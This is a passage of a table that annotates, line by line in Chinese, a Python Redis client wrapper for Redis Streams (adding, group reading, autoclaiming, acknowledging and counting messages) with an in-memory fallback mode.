| 292 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 293 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            stream: 流名称。` |
| 294 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            fields: 消息字段字典；value 非字符串会自动 JSON 序列化。` |
| 295 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            maxlen: 软上限（\`XADD MAXLEN ~\`），保护 Redis 内存。` |
| 296 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            approximate: 是否允许近似修剪（Redis 推荐 True，性能更好）。` |
| 297 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 298 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 299 | 代码语句：参与当前文件的业务流程或数据处理。 | `            成功时返回新增消息的 id（形如 \`\`1700000000000-0\`\`）；失败返回 None。` |
| 300 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 301 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        encoded = {k: self._serialize(v) for k, v in fields.items()}` |
| 302 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 303 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 304 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 305 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                kwargs: Dict[str, Any] = {}` |
| 306 | 条件判断：满足条件时进入对应分支。 | `                if maxlen is not None:` |
| 307 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    kwargs["maxlen"] = int(maxlen)` |
| 308 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    kwargs["approximate"] = bool(approximate)` |
| 309 | 返回结果：把处理后的值交回调用方。 | `                return self._client.xadd(stream, encoded, **kwargs)  # type: ignore[union-attr]` |
| 310 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 311 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] xadd 失败降级: %s", exc)` |
| 312 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 313 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 314 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 315 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            st = self._mem_streams.setdefault(stream, _InMemoryStream())` |
| 316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            msg_id = st.next_id()` |
| 317 | 函数调用：执行已有函数/方法完成当前步骤。 | `            st.entries.append((msg_id, encoded))` |
| 318 | 函数调用：执行已有函数/方法完成当前步骤。 | `            st.trim(maxlen)` |
| 319 | 返回结果：把处理后的值交回调用方。 | `            return msg_id` |
| 320 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 321 | 函数定义：声明 `stream_ensure_group` 的输入、处理逻辑和返回结果。 | `    def stream_ensure_group(` |
| 322 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 323 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream: str,` |
| 324 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group: str,` |
| 325 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mkstream: bool = True,` |
| 326 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        start_id: str = "0",` |
| 327 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> bool:` |
| 328 | 文档字符串：说明当前模块、类或函数的职责。 | `        """确保 consumer group 存在；已存在视为成功。"""` |
| 329 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 330 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._client.xgroup_create(  # type: ignore[union-attr]` |
| 332 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    name=stream, groupname=group, id=start_id, mkstream=mkstream` |
| 333 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 334 | 返回结果：把处理后的值交回调用方。 | `                return True` |
| 335 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 336 | 注释：解释下面或当前这段代码的设计意图。 | `                # redis.exceptions.ResponseError: BUSYGROUP 表示已存在` |
| 337 | 条件判断：满足条件时进入对应分支。 | `                if "BUSYGROUP" in str(exc):` |
| 338 | 返回结果：把处理后的值交回调用方。 | `                    return True` |
| 339 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] xgroup_create 失败降级: %s", exc)` |
| 340 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 341 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 342 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 343 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            st = self._mem_streams.setdefault(stream, _InMemoryStream())` |
| 344 | 条件判断：满足条件时进入对应分支。 | `            if group not in st.groups:` |
| 345 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                st.groups[group] = {` |
| 346 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "consumers": {},  # consumer -> set(id)` |
| 347 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "pending": {},    # id -> consumer` |
| 348 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "last_id": start_id,` |
| 349 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 350 | 返回结果：把处理后的值交回调用方。 | `            return True` |
| 351 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 352 | 函数定义：声明 `stream_read_group` 的输入、处理逻辑和返回结果。 | `    def stream_read_group(` |
| 353 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream: str,` |
| 355 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group: str,` |
| 356 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer: str,` |
| 357 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        count: int = 10,` |
| 358 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        block_ms: Optional[int] = None,` |
| 359 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Tuple[str, Dict[str, Any]]]:` |
| 360 | 文档字符串：说明当前模块、类或函数的职责。 | `        """以 consumer group 方式读取消息（只读未投递给本 group 的新消息）。` |
| 361 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 362 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 363 | 函数调用：执行已有函数/方法完成当前步骤。 | `            [(msg_id, fields_dict), ...]；空结果返回 []。` |
| 364 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 365 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 366 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 367 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                block = int(block_ms) if block_ms is not None else None` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw = self._client.xreadgroup(  # type: ignore[union-attr]` |
| 369 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    groupname=group,` |
| 370 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    consumername=consumer,` |
| 371 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    streams={stream: ">"},` |
| 372 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    count=int(count),` |
| 373 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    block=block,` |
| 374 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 375 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                out: List[Tuple[str, Dict[str, Any]]] = []` |
| 376 | 循环：逐个处理集合或迭代器中的元素。 | `                for _stream_name, entries in raw or []:` |
| 377 | 循环：逐个处理集合或迭代器中的元素。 | `                    for msg_id, fields in entries:` |
| 378 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        decoded = {k: self._deserialize(v) for k, v in fields.items()}` |
| 379 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        out.append((msg_id, decoded))` |
| 380 | 返回结果：把处理后的值交回调用方。 | `                return out` |
| 381 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 382 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] xreadgroup 失败降级: %s", exc)` |
| 383 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 384 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 385 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 386 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            st = self._mem_streams.get(stream)` |
| 387 | 条件判断：满足条件时进入对应分支。 | `            if st is None or group not in st.groups:` |
| 388 | 返回结果：把处理后的值交回调用方。 | `                return []` |
| 389 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            grp = st.groups[group]` |
| 390 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            consumers: Dict[str, Set[str]] = grp["consumers"]` |
| 391 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pending: Dict[str, str] = grp["pending"]` |
| 392 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 393 | 注释：解释下面或当前这段代码的设计意图。 | `            # 仅读取 last_id 之后的消息` |
| 394 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            last_id = grp["last_id"]` |
| 395 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            collected: List[Tuple[str, Dict[str, Any]]] = []` |
| 396 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            last_seen = last_id` |
| 397 | 循环：逐个处理集合或迭代器中的元素。 | `            for msg_id, fields in st.entries:` |
| 398 | 条件判断：满足条件时进入对应分支。 | `                if _compare_stream_id(msg_id, last_id) <= 0:` |
| 399 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 400 | 函数调用：执行已有函数/方法完成当前步骤。 | `                collected.append(` |
| 401 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    (msg_id, {k: self._deserialize(v) for k, v in fields.items()})` |
| 402 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 403 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                last_seen = msg_id` |
| 404 | 条件判断：满足条件时进入对应分支。 | `                if len(collected) >= count:` |
| 405 | 跳出循环：提前结束当前循环。 | `                    break` |
| 406 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 407 | 注释：解释下面或当前这段代码的设计意图。 | `            # 登记 pending` |
| 408 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            consumer_set = consumers.setdefault(consumer, set())` |
| 409 | 循环：逐个处理集合或迭代器中的元素。 | `            for msg_id, _ in collected:` |
| 410 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                pending[msg_id] = consumer` |
| 411 | 函数调用：执行已有函数/方法完成当前步骤。 | `                consumer_set.add(msg_id)` |
| 412 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 413 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            grp["last_id"] = last_seen` |
| 414 | 返回结果：把处理后的值交回调用方。 | `            return collected` |
| 415 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 416 | 函数定义：声明 `stream_read_own_pending` 的输入、处理逻辑和返回结果。 | `    def stream_read_own_pending(` |
| 417 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 418 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream: str,` |
| 419 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group: str,` |
| 420 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer: str,` |
| 421 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        count: int = 10,` |
| 422 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Tuple[str, Dict[str, Any]]]:` |
| 423 | 文档字符串：说明当前模块、类或函数的职责。 | `        """读取已投递给当前 consumer 但未 ack 的消息（PEL），用于失败重试。` |
| 424 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 425 | 代码语句：参与当前文件的业务流程或数据处理。 | `        对应 Redis \`\`XREADGROUP ... STREAMS <key> 0\`\`（非 \`\`>\`\`）。` |
| 426 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 427 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 428 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 429 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw = self._client.xreadgroup(  # type: ignore[union-attr]` |
| 430 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    groupname=group,` |
| 431 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    consumername=consumer,` |
| 432 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    streams={stream: "0"},` |
| 433 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    count=int(count),` |
| 434 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    block=0,` |
| 435 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 436 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                out: List[Tuple[str, Dict[str, Any]]] = []` |
| 437 | 循环：逐个处理集合或迭代器中的元素。 | `                for _stream_name, entries in raw or []:` |
| 438 | 循环：逐个处理集合或迭代器中的元素。 | `                    for msg_id, fields in entries:` |
| 439 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        decoded = {k: self._deserialize(v) for k, v in fields.items()}` |
| 440 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        out.append((msg_id, decoded))` |
| 441 | 返回结果：把处理后的值交回调用方。 | `                return out` |
| 442 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 443 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] xreadgroup(pending) 失败降级: %s", exc)` |
| 444 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 445 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 446 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 447 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            st = self._mem_streams.get(stream)` |
| 448 | 条件判断：满足条件时进入对应分支。 | `            if st is None or group not in st.groups:` |
| 449 | 返回结果：把处理后的值交回调用方。 | `                return []` |
| 450 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            grp = st.groups[group]` |
| 451 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pending: Dict[str, str] = grp["pending"]` |
| 452 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            id_to_fields: Dict[str, Dict[str, Any]] = {` |
| 453 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                mid: {k: self._deserialize(v) for k, v in fd.items()}` |
| 454 | 循环：逐个处理集合或迭代器中的元素。 | `                for mid, fd in st.entries` |
| 455 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 456 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            out: List[Tuple[str, Dict[str, Any]]] = []` |
| 457 | 循环：逐个处理集合或迭代器中的元素。 | `            for msg_id, owner in list(pending.items()):` |
| 458 | 条件判断：满足条件时进入对应分支。 | `                if owner != consumer:` |
| 459 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 460 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                fields = id_to_fields.get(msg_id)` |
| 461 | 条件判断：满足条件时进入对应分支。 | `                if fields is None:` |
| 462 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 463 | 函数调用：执行已有函数/方法完成当前步骤。 | `                out.append((msg_id, dict(fields)))` |
| 464 | 条件判断：满足条件时进入对应分支。 | `                if len(out) >= int(count):` |
| 465 | 跳出循环：提前结束当前循环。 | `                    break` |
| 466 | 返回结果：把处理后的值交回调用方。 | `            return out` |
| 467 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 468 | 函数定义：声明 `stream_autoclaim` 的输入、处理逻辑和返回结果。 | `    def stream_autoclaim(` |
| 469 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 470 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream: str,` |
| 471 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group: str,` |
| 472 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer: str,` |
| 473 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        min_idle_ms: int,` |
| 474 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        start: str = "0-0",` |
| 475 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        count: int = 10,` |
| 476 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Tuple[str, Dict[str, Any]]]:` |
| 477 | 文档字符串：说明当前模块、类或函数的职责。 | `        """认领空闲时间超过 \`\`min_idle_ms\`\` 的 pending 消息（\`\`XAUTOCLAIM\`\`）。` |
| 478 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 479 | 代码语句：参与当前文件的业务流程或数据处理。 | `        用于崩溃后其它 consumer 实例回收滞留消息；内存模式下返回空列表。` |
| 480 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 481 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 482 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 483 | 注释：解释下面或当前这段代码的设计意图。 | `                # redis-py: xautoclaim returns [next_start, messages, deleted_ids]` |
| 484 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw = self._client.xautoclaim(  # type: ignore[union-attr]` |
| 485 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    name=stream,` |
| 486 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    groupname=group,` |
| 487 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    consumername=consumer,` |
| 488 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    min_idle_time=int(min_idle_ms),` |
| 489 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    start_id=start,` |
| 490 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    count=int(count),` |
| 491 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    justid=False,` |
| 492 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 493 | 条件判断：满足条件时进入对应分支。 | `                if not raw or not isinstance(raw, (list, tuple)):` |
| 494 | 返回结果：把处理后的值交回调用方。 | `                    return []` |
| 495 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                messages = raw[1] if len(raw) > 1 else []` |
| 496 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                out: List[Tuple[str, Dict[str, Any]]] = []` |
| 497 | 循环：逐个处理集合或迭代器中的元素。 | `                for item in messages or []:` |
| 498 | 条件判断：满足条件时进入对应分支。 | `                    if isinstance(item, (list, tuple)) and len(item) >= 2:` |
| 499 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        msg_id, fields = item[0], item[1]` |
| 500 | 兜底分支：处理前面条件都不满足的情况。 | `                    else:` |
| 501 | 继续循环：跳过本轮剩余逻辑。 | `                        continue` |
| 502 | 条件判断：满足条件时进入对应分支。 | `                    if not isinstance(fields, dict):` |
| 503 | 继续循环：跳过本轮剩余逻辑。 | `                        continue` |
| 504 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    decoded = {k: self._deserialize(v) for k, v in fields.items()}` |
| 505 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    out.append((str(msg_id), decoded))` |
| 506 | 返回结果：把处理后的值交回调用方。 | `                return out` |
| 507 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 508 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[RedisClient] xautoclaim 失败: %s", exc)` |
| 509 | 返回结果：把处理后的值交回调用方。 | `                return []` |
| 510 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 511 | 返回结果：把处理后的值交回调用方。 | `        return []` |
| 512 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 513 | 函数定义：声明 `stream_ack` 的输入、处理逻辑和返回结果。 | `    def stream_ack(self, stream: str, group: str, ids: List[str]) -> int:` |
| 514 | 文档字符串：说明当前模块、类或函数的职责。 | `        """确认消费 ids；返回成功 ack 的数量。"""` |
| 515 | 条件判断：满足条件时进入对应分支。 | `        if not ids:` |
| 516 | 返回结果：把处理后的值交回调用方。 | `            return 0` |
| 517 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 518 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 519 | 返回结果：把处理后的值交回调用方。 | `                return int(self._client.xack(stream, group, *ids))  # type: ignore[union-attr]` |
| 520 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 521 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] xack 失败降级: %s", exc)` |
| 522 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 523 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 524 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 525 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            st = self._mem_streams.get(stream)` |
| 526 | 条件判断：满足条件时进入对应分支。 | `            if st is None or group not in st.groups:` |
| 527 | 返回结果：把处理后的值交回调用方。 | `                return 0` |
| 528 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            grp = st.groups[group]` |
| 529 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pending: Dict[str, str] = grp["pending"]` |
| 530 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            consumers: Dict[str, Set[str]] = grp["consumers"]` |
| 531 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            acked = 0` |
| 532 | 循环：逐个处理集合或迭代器中的元素。 | `            for msg_id in ids:` |
| 533 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                consumer = pending.pop(msg_id, None)` |
| 534 | 条件判断：满足条件时进入对应分支。 | `                if consumer is None:` |
| 535 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 536 | 函数调用：执行已有函数/方法完成当前步骤。 | `                consumers.get(consumer, set()).discard(msg_id)` |
| 537 | 代码语句：参与当前文件的业务流程或数据处理。 | `                acked += 1` |
| 538 | 返回结果：把处理后的值交回调用方。 | `            return acked` |
| 539 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 540 | 函数定义：声明 `stream_pending` 的输入、处理逻辑和返回结果。 | `    def stream_pending(self, stream: str, group: str) -> int:` |
| 541 | 文档字符串：说明当前模块、类或函数的职责。 | `        """返回当前 group 中 pending（未 ack）消息的数量。"""` |
| 542 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 543 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 544 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                info = self._client.xpending(stream, group)  # type: ignore[union-attr]` |
| 545 | 条件判断：满足条件时进入对应分支。 | `                if isinstance(info, dict):` |
| 546 | 返回结果：把处理后的值交回调用方。 | `                    return int(info.get("pending", 0))` |
| 547 | 条件判断：满足条件时进入对应分支。 | `                if isinstance(info, (list, tuple)) and info:` |
| 548 | 注释：解释下面或当前这段代码的设计意图。 | `                    # 旧 API：[count, min, max, consumers]` |
| 549 | 返回结果：把处理后的值交回调用方。 | `                    return int(info[0] or 0)` |
| 550 | 返回结果：把处理后的值交回调用方。 | `                return 0` |
| 551 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 552 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[RedisClient] xpending 失败: %s", exc)` |
| 553 | 返回结果：把处理后的值交回调用方。 | `                return 0` |
| 554 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 555 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 556 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            st = self._mem_streams.get(stream)` |
| 557 | 条件判断：满足条件时进入对应分支。 | `            if st is None or group not in st.groups:` |
| 558 | 返回结果：把处理后的值交回调用方。 | `                return 0` |
| 559 | 返回结果：把处理后的值交回调用方。 | `            return len(st.groups[group]["pending"])` |
| 560 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 561 | 函数定义：声明 `stream_len` 的输入、处理逻辑和返回结果。 | `    def stream_len(self, stream: str) -> int:` |
| 562 | 文档字符串：说明当前模块、类或函数的职责。 | `        """返回流的总消息数。"""` |
| 563 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 564 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 565 | 返回结果：把处理后的值交回调用方。 | `                return int(self._client.xlen(stream))  # type: ignore[union-attr]` |
| 566 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 567 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[RedisClient] xlen 失败: %s", exc)` |
| 568 | 返回结果：把处理后的值交回调用方。 | `                return 0` |
| 569 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 570 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            st = self._mem_streams.get(stream)` |
| 571 | 返回结果：把处理后的值交回调用方。 | `            return len(st.entries) if st else 0` |
| 572 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 573 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 574 | 注释：解释下面或当前这段代码的设计意图。 | `    # 内部工具` |
| 575 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 576 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 577 | 函数定义：声明 `_serialize` 的输入、处理逻辑和返回结果。 | `    def _serialize(value: Any) -> str:` |
| 578 | 文档字符串：说明当前模块、类或函数的职责。 | `        """对外统一以 JSON 字符串存储，保证跨模式一致。"""` |
| 579 | 条件判断：满足条件时进入对应分支。 | `        if isinstance(value, str):` |
| 580 | 返回结果：把处理后的值交回调用方。 | `            return value` |
| 581 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 582 | 返回结果：把处理后的值交回调用方。 | `            return json.dumps(value, ensure_ascii=False)` |
| 583 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except TypeError:` |
| 584 | 返回结果：把处理后的值交回调用方。 | `            return str(value)` |
| 585 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 586 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 587 | 函数定义：声明 `_deserialize` 的输入、处理逻辑和返回结果。 | `    def _deserialize(raw: Any) -> Any:` |
| 588 | 文档字符串：说明当前模块、类或函数的职责。 | `        """若为合法 JSON 则还原，否则原样返回字符串。"""` |
| 589 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(raw, str):` |
| 590 | 返回结果：把处理后的值交回调用方。 | `            return raw` |
| 591 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 592 | 返回结果：把处理后的值交回调用方。 | `            return json.loads(raw)` |
| 593 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (ValueError, TypeError):` |
| 594 | 返回结果：把处理后的值交回调用方。 | `            return raw` |
| 595 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 596 | 函数定义：声明 `_degrade` 的输入、处理逻辑和返回结果。 | `    def _degrade(self) -> None:` |
| 597 | 文档字符串：说明当前模块、类或函数的职责。 | `        """Redis 运行期出现异常时主动切换到内存模式。"""` |
| 598 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._client = None` |
| 599 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mode = "memory"` |
| 600 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[RedisClient] 已切换到内存降级模式")` |
| 601 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 602 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 603 | 注释：解释下面或当前这段代码的设计意图。 | `# ---------------------------------------------------------------------` |
